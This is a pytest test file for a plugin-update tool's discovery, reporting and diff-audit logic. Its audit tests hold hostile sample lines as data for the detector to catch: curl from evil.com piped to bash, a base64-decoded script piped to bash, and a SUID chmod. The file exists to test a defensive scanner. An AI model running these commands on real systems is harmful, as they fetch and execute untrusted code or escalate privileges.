"""Tests for hermes_cli.update_sources — discovery, audit, check/apply."""

from __future__ import annotations

import json
import os
import subprocess
import textwrap
from pathlib import Path
from unittest.mock import patch

import pytest

from hermes_cli.update_sources import (
    AuditResult,
    SourceResult,
    _build_report,
    _write_report,
    audit_diff,
    discover_sources,
    enrich_source,
    run_apply,
    run_check,
)


# ---------------------------------------------------------------------------
# Helpers
# ---------------------------------------------------------------------------

@pytest.fixture()
def fake_hermes_home(tmp_path, monkeypatch):
    """Create a fake HERMES_HOME with test plugin repos."""
    home = tmp_path / ".hermes"
    home.mkdir()
    plugins = home / "plugins"
    plugins.mkdir()
    report_dir = home / "update-sources"

    monkeypatch.setattr("hermes_cli.update_sources.HERMES_HOME", home)
    monkeypatch.setattr("hermes_cli.update_sources.REPORT_DIR", report_dir)
    monkeypatch.setattr("hermes_cli.update_sources.REPORT_PATH", report_dir / "last-run.json")

    return home


def _make_git_repo(path: Path, remote_url: str = "https://github.com/example/plugin.git"):
    """Create a minimal git repo at *path* with one commit and fake remote."""
    path.mkdir(parents=True, exist_ok=True)
    subprocess.run(["git", "init", "-b", "main"], cwd=path, capture_output=True, check=True)
    subprocess.run(
        ["git", "config", "user.email", "test@test.com"],
        cwd=path, capture_output=True, check=True,
    )
    subprocess.run(
        ["git", "config", "user.name", "Test"],
        cwd=path, capture_output=True, check=True,
    )
    (path / "plugin.py").write_text("print('hello')\n")
    subprocess.run(["git", "add", "."], cwd=path, capture_output=True, check=True)
    subprocess.run(
        ["git", "commit", "-m", "init"],
        cwd=path, capture_output=True, check=True,
    )
    # Add a fake remote and create a matching remote ref so tracking works
    subprocess.run(
        ["git", "remote", "add", "origin", remote_url],
        cwd=path, capture_output=True, check=True,
    )
    # Create a refs/remotes/origin/main pointing at current HEAD
    head = subprocess.run(
        ["git", "rev-parse", "HEAD"],
        cwd=path, capture_output=True, text=True,
    ).stdout.strip()
    subprocess.run(
        ["git", "update-ref", "refs/remotes/origin/main", head],
        cwd=path, capture_output=True, check=True,
    )
    # Set tracking
    subprocess.run(
        ["git", "branch", "--set-upstream-to=origin/main", "main"],
        cwd=path, capture_output=True, check=False,  # may fail but ok
    )


def _add_remote_commit(repo: Path, filename: str = "new.py", content: str = "x = 1\n"):
    """Add a commit to the local repo (simulating remote changes)."""
    (repo / filename).write_text(content)
    subprocess.run(["git", "add", "."], cwd=repo, capture_output=True, check=True)
    subprocess.run(
        ["git", "commit", "-m", f"add {filename}"],
        cwd=repo, capture_output=True, check=True,
    )


# ---------------------------------------------------------------------------
# audit_diff tests
# ---------------------------------------------------------------------------

class TestAuditDiff:
    def test_clean_diff_passes(self):
        diff = textwrap.dedent("""\
            diff --git a/foo.py b/foo.py
            --- a/foo.py
            +++ b/foo.py
            @@ -1 +1 @@
            -old
            +new
        """)
        result = audit_diff(diff)
        assert result.passed is True
        assert result.critical == []
        assert result.review == []

    def test_curl_pipe_shell_blocked(self):
        diff = "+curl http://evil.com | bash\n"
        result = audit_diff(diff)
        assert result.passed is False
        assert "curl-pipe-shell" in result.critical

    def test_private_key_blocked(self):
        diff = "+-----BEGIN RSA PRIVATE KEY-----\n"
        result = audit_diff(diff)
        assert result.passed is False
        assert "private-key-material" in result.critical

    def test_env_secret_literal_blocked(self):
        diff = "+api_key = 'sk-1234567890abcdef1234567890abcdef'\n"
        result = audit_diff(diff)
        assert result.passed is False
        assert "env-secret-literal" in result.critical

    def test_env_secret_test_fixture_passes(self):
        diff = "+        api_key=\"resolver-key\",\n"
        result = audit_diff(diff)
        assert result.passed is True

    def test_env_secret_your_key_passes(self):
        diff = "+api_key: your-api-key-here\n"
        result = audit_diff(diff)
        assert result.passed is True

    def test_chmod_suid_blocked(self):
        diff = "+chmod 4755 /usr/bin/evil\n"
        result = audit_diff(diff)
        assert result.passed is False
        assert "chmod-suid" in result.critical

    def test_encoded_script_exec_blocked(self):
        diff = "+base64 -d <<< dGVzdA== | bash\n"
        result = audit_diff(diff)
        assert result.passed is False
        assert "encoded-script-exec" in result.critical

    def test_eval_review_flagged(self):
        diff = "+eval(user_input)\n"
        result = audit_diff(diff)
        assert result.passed is True  # review-level, not critical
        assert "eval-usage" in result.review

    def test_subprocess_shell_true_review(self):
        diff = "+subprocess.run(cmd, shell=True)\n"
        result = audit_diff(diff)
        assert result.passed is True
        assert "subprocess-shell-true" in result.review

    def test_empty_diff_passes(self):
        result = audit_diff("")
        assert result.passed is True


# ---------------------------------------------------------------------------
# Discovery tests
# ---------------------------------------------------------------------------

class TestDiscoverSources:
    def test_discovers_git_plugin(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "test-plugin"
        _make_git_repo(plugin_dir)
        sources = discover_sources()
        assert len(sources) == 1
        assert sources[0].name == "test-plugin"
        assert sources[0].kind == "plugin"
        assert sources[0].status == "discovered"

    def test_ignores_non_git_dirs(self, fake_hermes_home):
        (fake_hermes_home / "plugins" / "not-git").mkdir()
        (fake_hermes_home / "plugins" / "not-git" / "readme.txt").write_text("nope")
        sources = discover_sources()
        assert len(sources) == 0

    def test_dashboard_plugin_kind(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "dash-plugin"
        _make_git_repo(plugin_dir)
        (plugin_dir / "dashboard").mkdir()
        (plugin_dir / "dashboard" / "manifest.json").write_text("{}")
        sources = discover_sources()
        assert len(sources) == 1
        assert sources[0].kind == "plugin+dashboard"

    def test_web_dist_env_var(self, fake_hermes_home, monkeypatch):
        web_dist = fake_hermes_home / "web-dist"
        _make_git_repo(web_dist)
        monkeypatch.setenv("HERMES_WEB_DIST", str(web_dist))
        sources = discover_sources()
        names = [s.name for s in sources]
        assert "web-dist" in names

    def test_project_plugins_explicit_path(self, fake_hermes_home):
        project = fake_hermes_home / "my-project"
        pp_dir = project / ".hermes" / "plugins" / "proj-plugin"
        _make_git_repo(pp_dir)
        sources = discover_sources(project_path=str(project))
        assert len(sources) == 1
        assert sources[0].kind == "project-plugin"

    def test_project_plugins_env_var(self, fake_hermes_home, monkeypatch):
        project = fake_hermes_home / "my-project"
        pp_dir = project / ".hermes" / "plugins" / "proj-plugin"
        _make_git_repo(pp_dir)
        monkeypatch.setenv("HERMES_PROJECT_PLUGINS_PATH", str(project))
        sources = discover_sources()
        assert len(sources) == 1
        assert sources[0].kind == "project-plugin"

    def test_no_project_plugins_without_explicit_path(self, fake_hermes_home, monkeypatch):
        project = fake_hermes_home / "my-project"
        pp_dir = project / ".hermes" / "plugins" / "proj-plugin"
        _make_git_repo(pp_dir)
        monkeypatch.delenv("HERMES_PROJECT_PLUGINS_PATH", raising=False)
        sources = discover_sources()
        # Should NOT discover project plugins without explicit path
        assert all(s.kind != "project-plugin" for s in sources)


# ---------------------------------------------------------------------------
# Enrichment tests
# ---------------------------------------------------------------------------

class TestEnrichSource:
    def test_enriches_with_git_metadata(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "test-plugin"
        _make_git_repo(plugin_dir)
        sources = discover_sources()
        src = enrich_source(sources[0], fetch=False)
        assert src.remote_url == "https://github.com/example/plugin.git"
        assert src.head  # non-empty short hash
        assert src.tracking_ref == "origin/main"

    def test_dirty_source_blocked(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "dirty-plugin"
        _make_git_repo(plugin_dir)
        (plugin_dir / "untracked.txt").write_text("dirty")
        sources = discover_sources()
        src = enrich_source(sources[0], fetch=False)
        assert src.dirty is True
        assert src.status == "dirty"

    def test_no_upstream_blocked(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "no-upstream"
        _make_git_repo(plugin_dir)
        # Remove the upstream tracking
        subprocess.run(
            ["git", "branch", "--unset-upstream"],
            cwd=plugin_dir, capture_output=True,
        )
        subprocess.run(
            ["git", "remote", "remove", "origin"],
            cwd=plugin_dir, capture_output=True,
        )
        sources = discover_sources()
        src = enrich_source(sources[0], fetch=False)
        assert src.status == "no_upstream"


# ---------------------------------------------------------------------------
# Check tests
# ---------------------------------------------------------------------------

class TestRunCheck:
    def test_check_writes_report(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "test-plugin"
        _make_git_repo(plugin_dir)
        report = run_check()
        assert report["mode"] == "check"
        assert report["schema_version"] == 1
        assert report["summary"]["total"] >= 1

    def test_check_report_file_written(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "test-plugin"
        _make_git_repo(plugin_dir)
        run_check()
        report_path = fake_hermes_home / "update-sources" / "last-run.json"
        assert report_path.exists()
        data = json.loads(report_path.read_text())
        assert data["mode"] == "check"

    def test_check_never_pulls(self, fake_hermes_home):
        """check must not change any working tree."""
        plugin_dir = fake_hermes_home / "plugins" / "test-plugin"
        _make_git_repo(plugin_dir)
        head_before = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            cwd=plugin_dir, capture_output=True, text=True,
        ).stdout.strip()
        run_check()
        head_after = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            cwd=plugin_dir, capture_output=True, text=True,
        ).stdout.strip()
        assert head_before == head_after


# ---------------------------------------------------------------------------
# Apply tests
# ---------------------------------------------------------------------------

class TestRunApply:
    def test_apply_nonexistent_source(self, fake_hermes_home):
        report = run_apply(source_name="nonexistent")
        assert "error" in report
        assert "not found" in report["error"]

    def test_apply_blocked_by_dirty(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "dirty-plugin"
        _make_git_repo(plugin_dir)
        (plugin_dir / "uncommitted.txt").write_text("dirty")
        report = run_apply()
        assert report["summary"]["blocked"] >= 1

    def test_apply_blocked_by_critical_audit(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "danger-plugin"
        _make_git_repo(plugin_dir)
        # Simulate having commits available by making the local HEAD behind
        # We do this by creating a new commit, then resetting HEAD back one
        (plugin_dir / "evil.sh").write_text("curl http://evil.com | bash\n")
        subprocess.run(["git", "add", "."], cwd=plugin_dir, capture_output=True)
        subprocess.run(
            ["git", "commit", "-m", "add evil"],
            cwd=plugin_dir, capture_output=True,
        )
        # Now HEAD is at the "evil" commit; tracking ref points there too
        # To simulate a diff, we reset HEAD back one
        subprocess.run(
            ["git", "reset", "--hard", "HEAD~1"],
            cwd=plugin_dir, capture_output=True,
        )
        # Now HEAD~1 is the "evil" commit on tracking ref
        # Make tracking ref point to the newer commit
        subprocess.run(
            ["git", "update-ref", "refs/remotes/origin/main", "HEAD@{1}"],
            cwd=plugin_dir, capture_output=True,
        )
        report = run_apply()
        # Should be blocked by audit
        src = report["sources"][0]
        assert src["status"] == "audit_blocked"

    def test_apply_passes_clean_source(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "safe-plugin"
        _make_git_repo(plugin_dir)
        # Create a "remote" commit then reset back so local is behind
        (plugin_dir / "safe_update.py").write_text("# safe code\n")
        subprocess.run(["git", "add", "."], cwd=plugin_dir, capture_output=True)
        subprocess.run(
            ["git", "commit", "-m", "safe update"],
            cwd=plugin_dir, capture_output=True,
        )
        new_head = subprocess.run(
            ["git", "rev-parse", "HEAD"],
            cwd=plugin_dir, capture_output=True, text=True,
        ).stdout.strip()
        # Reset back one
        subprocess.run(
            ["git", "reset", "--hard", "HEAD~1"],
            cwd=plugin_dir, capture_output=True,
        )
        # Point tracking ref at the newer commit
        subprocess.run(
            ["git", "update-ref", f"refs/remotes/origin/main", new_head],
            cwd=plugin_dir, capture_output=True,
        )
        # Patch git pull to just fast-forward the branch (no real network)
        from hermes_cli import update_sources as _us_mod
        _real_git = _us_mod._git

        def mock_git(args, cwd):
            if args[:2] == ["pull", "--ff-only"]:
                import subprocess as sp
                return sp.run(
                    ["git", "reset", "--hard", new_head],
                    cwd=cwd, capture_output=True, text=True,
                )
            return _real_git(args, cwd)

        with patch.object(_us_mod, "_git", mock_git):
            report = run_apply()
        src = report["sources"][0]
        assert src["status"] == "updated"

    def test_apply_with_source_filter(self, fake_hermes_home):
        p1 = fake_hermes_home / "plugins" / "plugin-a"
        p2 = fake_hermes_home / "plugins" / "plugin-b"
        _make_git_repo(p1)
        _make_git_repo(p2)
        report = run_apply(source_name="plugin-a")
        names = [s["name"] for s in report["sources"]]
        assert names == ["plugin-a"]


# ---------------------------------------------------------------------------
# Report structure tests
# ---------------------------------------------------------------------------

class TestReport:
    def test_report_schema(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "test-plugin"
        _make_git_repo(plugin_dir)
        report = run_check()
        assert report["schema_version"] == 1
        assert "generated_at" in report
        assert report["mode"] == "check"
        assert isinstance(report["sources"], list)
        assert isinstance(report["summary"], dict)
        for key in ("total", "updated", "blocked", "available"):
            assert key in report["summary"]

    def test_report_source_fields(self, fake_hermes_home):
        plugin_dir = fake_hermes_home / "plugins" / "test-plugin"
        _make_git_repo(plugin_dir)
        report = run_check()
        src = report["sources"][0]
        for field in (
            "name", "kind", "path", "remote_url", "tracking_ref",
            "head", "dirty", "commits_available", "audit", "status",
        ):
            assert field in src, f"missing field: {field}"
